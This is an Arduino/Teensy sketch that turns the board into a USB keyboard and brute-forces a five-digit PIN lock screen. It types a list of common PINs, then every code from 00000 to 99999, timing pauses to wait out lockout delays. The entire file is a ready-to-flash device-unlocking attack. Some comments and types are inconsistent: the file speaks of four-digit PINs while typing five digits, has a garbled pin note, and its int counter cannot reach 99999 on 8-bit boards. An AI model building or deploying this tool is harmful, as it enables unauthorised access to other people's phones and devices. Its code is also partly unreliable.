int fPINinput = 0;
int i = 0;
const int ledPin = 11;
// Pin 13: Arduino has an LED connected on pin 13
// Pin 11: Teensy 2.0 has the LED on pin 11
// Pin  6: Teensy++ 2.0 has the LED on pin 6
// Pin 13: Teensy 3.0 has the LED on pin 130000



void setup()
{
  pinMode(ledPin, OUTPUT);
  delay(5000);
}

void loop()


{


  if (fPINinput == 0) {
    
    // 20 most used 4 digits pin + adds
    Keyboard.println("11111");
    delay(100);
	  Keyboard.println("12345");
    delay(100);
	  Keyboard.println("00000");
    delay(100);
	  Keyboard.println("54321");
    delay(100);
	  Keyboard.println("77777");
    delay(30000);
	  Keyboard.println("13579");
    delay(100);
	  Keyboard.println("12321");
    delay(100);
	  Keyboard.println("44444");
    delay(100);
	  Keyboard.println("22222");
    delay(100);
	  Keyboard.println("00700");
    delay(30000);
    Keyboard.println("99999");
    delay(100);
	  Keyboard.println("33333");
    delay(100);
	  Keyboard.println("55555");
    delay(100);
	  Keyboard.println("66666");
    delay(100);
	  Keyboard.println("90210");
    delay(30000);
    Keyboard.println("38317");
    delay(100);
	  Keyboard.println("88888");
    delay(100); 
	  Keyboard.println("09876");
    delay(100); 
	  Keyboard.println("98765");
    delay(100); 
	  Keyboard.println("01234");
    delay(30000);
	  Keyboard.println("42069");
    delay(100);
	  Keyboard.println("43210");
    delay(100);
	  Keyboard.println("67890");
    delay(100);
	  Keyboard.println("99997");
    delay(100);
	  Keyboard.println("99998");
    delay(30000);
 	
    

    //start bruteforce
    for (int i = 0; i <= 99999; i++) {
      digitalWrite(ledPin, LOW);
      String pad = i;

      if (i <= 9) {
        Keyboard.println("0000" + pad);
      }
      else if (i >= 10 && i <= 99) {
        Keyboard.println("000" + pad);
      }
      else if (i >= 100 && i <= 999) {
        Keyboard.println("00" + pad);
      }
	  
	  else if (i >= 1000 && i <= 9999) {
        Keyboard.println("0" + pad);
      }
	  
      else {
        Keyboard.println(i);
      }

      delay(500);
      

      if (i != 0 && i % 5 == 0) {
        digitalWrite(ledPin, HIGH);
        delay(30000);
        
      }
    }
    fPINinput = 1;
  }
  else
  {
    digitalWrite(ledPin, HIGH);
    delay(2500);
    digitalWrite(ledPin, LOW);
    delay(2500);
    Keyboard.println();
  }
}
